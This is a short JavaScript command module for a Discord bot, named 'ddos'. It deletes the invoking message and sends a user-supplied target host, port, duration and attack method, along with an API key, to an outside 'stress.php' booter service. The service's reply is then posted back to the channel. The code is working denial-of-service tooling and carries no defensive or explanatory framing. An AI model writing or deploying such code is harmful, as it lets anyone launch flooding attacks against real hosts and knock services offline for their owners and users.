const Discord = require("discord.js");
const superagent = require("superagent");

module.exports.run = async (bot,message,args) => {

message.delete()
let body = await superagent
     .post(`http://api.protechable.com/stress.php?key=${args[0]}&h=${args[1]}&p=${args[2]}&t=${args[3]}&m=${args[4]}`)
     .end((err, res) => {
      console.log(res.res.text)
      message.channel.send(res.res.text)
      console.log(`http://api.protechable.com/stress.php?key=${args[0]}&h=${args[1]}&p=${args[2]}&t=${args[3]}&m=${args[4]}`)
    });
}
  module.exports.help = {
    name: "ddos"
  }
